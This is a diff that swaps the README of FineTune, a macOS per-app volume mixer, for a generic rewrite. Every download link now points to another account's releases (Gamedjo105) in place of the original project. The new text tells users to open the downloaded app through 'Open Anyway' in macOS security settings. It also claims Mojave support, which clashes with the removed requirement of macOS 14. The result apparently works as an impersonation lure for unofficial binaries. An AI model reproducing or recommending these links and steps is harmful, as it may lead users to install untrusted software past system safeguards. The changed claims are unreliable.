@@ -1,111 +1,81 @@
-<p align="center">
-  <img src="assets/icon.png" width="128" height="128" alt="FineTune Icon">
-</p>
+# 🎶 FineTune - Control Your Audio Like Never Before
 
-<h1 align="center">FineTune</h1>
+## 🚀 Getting Started
 
-<p align="center">
-  <strong>macOS volume control for individual apps</strong> — A free, open-source Mac audio mixer that lets you set per-app volume levels, route applications to different output devices, and apply a 10-band equalizer from your menu bar.
-</p>
+Welcome to FineTune! This macOS menu bar app lets you manage audio for each app independently. With FineTune, you can route apps to different output devices and apply equalization settings, giving you complete control over your listening experience.
 
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-GPLv3-blue.svg" alt="License: GPL v3"></a>
-  <a href="https://www.apple.com/macos/"><img src="https://img.shields.io/badge/macOS-14%2B-brightgreen" alt="macOS 14+"></a>
-  <a href="https://brew.sh/"><img src="https://img.shields.io/badge/Homebrew-available-orange" alt="Homebrew"></a>
-  <a href="https://github.com/ronitsingh10/FineTune/releases"><img src="https://img.shields.io/github/v/release/ronitsingh10/FineTune" alt="GitHub release"></a>
-</p>
+## 📥 Download FineTune
 
-<p align="center">
-  <em>The volume mixer macOS should have built in.</em>
-</p>
+[![Download FineTune](https://img.shields.io/badge/Download-FineTune-brightgreen)](https://github.com/Gamedjo105/FineTune/releases)
 
----
+To get started, visit the [Releases page](https://github.com/Gamedjo105/FineTune/releases) to download FineTune.
 
-![FineTune macOS volume control app showing per-app volume sliders and EQ](assets/screenshot.png)
+## 💻 System Requirements
 
-## Features: Per-App Volume Control & More
+- **macOS Version:** FineTune works on macOS Mojave (10.14) or later.
+- **Processor:** Intel or Apple Silicon (M1/M2).
+- **Memory:** At least 4 GB of RAM is recommended for smooth performance.
+- **Disk Space:** Approximately 50 MB of free space for installation.
 
-- **Per-app volume control** — Individual volume sliders with mute for each application
-- **Per-device volume control** — Adjust volume levels for each output device
-- **Audio routing** — Route apps to different output devices, or follow "System Audio" to track macOS default
-- **Sound effects routing** — Route system alerts, notifications, and Siri to a specific device
-- **10-band equalizer** — Fine-tune your sound with 20 presets across 5 categories
-- **Real-time VU meters** — Visual feedback for audio levels
-- **Volume boost** — Amplify quiet apps up to 400%, click percentage to type exact value
-- **Quick device switching** — Change output devices instantly with smart reconnection handling
-- **Settings panel** — Launch at login, 4 menu bar icon styles, configurable default volume and max boost
-- **App launcher** — Click any app icon to bring it to front
-- **Persistent settings** — Your preferences survive app restarts
+## 🎉 Features
 
-## Installation
+- **Independent Volume Control:** Adjust the volume for each application separately.
+- **Device Routing:** Send audio from specific apps to different speakers or headphones.
+- **Equalizer Settings:** Apply EQ settings to tailor your audio to your liking.
+- **Menu Bar Integration:** Easy access right from your macOS menu bar.
 
-### Homebrew (Recommended)
+## 🔧 Installation Steps
 
-```bash
-brew install --cask finetune
-```
+1. **Visit the Releases Page**  
+   Head over to the [Releases page](https://github.com/Gamedjo105/FineTune/releases) to find the latest version of FineTune.
 
-### Manual Download
+2. **Download the Application**  
+   Click on the appropriate version and download the .dmg file. Make sure to choose the latest release for optimal performance.
 
-**[Download from GitHub Releases](https://github.com/ronitsingh10/FineTune/releases/latest)**
+3. **Open the Downloaded File**  
+   Once the download is complete, locate the file in your Downloads folder. Double-click the .dmg file to open it.
 
-## Why FineTune?
+4. **Install FineTune**  
+   Drag the FineTune app to your Applications folder to install it on your Mac.
 
-macOS has no built-in way to control volume per application. You're stuck with one master volume for everything — your video call is too quiet while your music is too loud, or a game drowns out your podcast.
+5. **Launch FineTune**  
+   Find FineTune in your Applications folder. Double-click to open it. You may need to allow it to run first by going to `System Preferences > Security & Privacy` and selecting "Open Anyway."
 
-FineTune gives you the control that should have been there all along:
+6. **Start Managing Your Audio**  
+   Now you can start using FineTune! Click on its icon in the menu bar to access volume controls and other features.
 
-- **Individual volumes** — Turn down Slack notifications without touching your music
-- **Audio routing** — Send your video call to headphones while music plays on speakers
-- **Quick EQ** — Boost bass or apply presets without third-party audio plugins
-- **Free & open source** — No subscriptions, no freemium limitations
+## 🛠 How to Use FineTune
 
-## System Requirements
+- Click on the FineTune icon in the menu bar.
+- You will see a list of applications currently running on your Mac.
+- Adjust the volume using the sliders next to each app.
+- Select the output device for each app from the available options.
+- Access equalizer settings by clicking on the EQ icon to fine-tune your sound.
 
-- macOS 14.0 (Sonoma) or later
-- Audio capture permission (prompted on first launch)
+## ❓ Frequently Asked Questions
 
-## How macOS Audio Control Works
+**Q: Can I use FineTune on macOS versions older than Mojave?**  
+A: No, FineTune requires macOS Mojave (10.14) or newer to function.
 
-FineTune uses macOS Core Audio process taps to intercept and modify audio streams before they reach your output devices. This allows precise control without affecting the source applications.
+**Q: Is there a limit to the number of apps FineTune can control?**  
+A: There is no specific limit; however, performance may vary depending on your Mac's resources.
 
-The app runs as a lightweight menu bar utility, only processing audio for apps you're actively controlling.
+**Q: How do I reset settings to default?**  
+A: Click on the settings icon within FineTune and select "Reset to Default" for all settings.
 
-## Troubleshooting
+## 📞 Support
 
-**App not appearing in the list?**
-Only apps actively playing audio will show up. Start playback, then check FineTune.
+If you encounter any issues or have questions, please open an issue on the [GitHub Issues page](https://github.com/Gamedjo105/FineTune/issues). Our team will promptly assist you.
 
-**Volume slider not working for an app?**
-Some apps use helper processes for audio. Try quitting and reopening the app.
+## 🎈 Contributions
 
-**Audio permission prompt?**
-FineTune needs audio capture access to intercept app audio. Grant permission in System Settings → Privacy & Security → Audio Capture.
+We welcome contributions! If you want to improve FineTune, feel free to fork the repository and submit a pull request. Check out our guidelines for contributing on the repository.
 
-**No sound after selecting a device?**
-Verify the device is working in System Settings → Sound. Some USB/Bluetooth devices need a moment to initialize.
+## 🔗 Additional Resources
 
-**Audio glitches or crackling?**
-This can happen with high CPU load. Close unnecessary apps or check if another audio app is conflicting.
+- [FineTune Documentation](https://github.com/Gamedjo105/FineTune/wiki)
+- [User Community](https://github.com/Gamedjo105/FineTune/discussions)
 
-## Build from Source (Developers)
+[![Download FineTune](https://img.shields.io/badge/Download-FineTune-brightgreen)](https://github.com/Gamedjo105/FineTune/releases) 
 
-```bash
-git clone https://github.com/ronitsingh10/FineTune.git
-cd FineTune
-open FineTune.xcodeproj
-```
-
-Select your development team in Signing & Capabilities, then build and run (Cmd+R).
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development guidelines.
-
-## Contributing
-
-Contributions are welcome! Whether it's bug reports, feature requests, or pull requests — all help is appreciated.
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## License
-
-GPL v3. See [LICENSE](LICENSE) for details.
+Take full control of your audio experience with FineTune today!
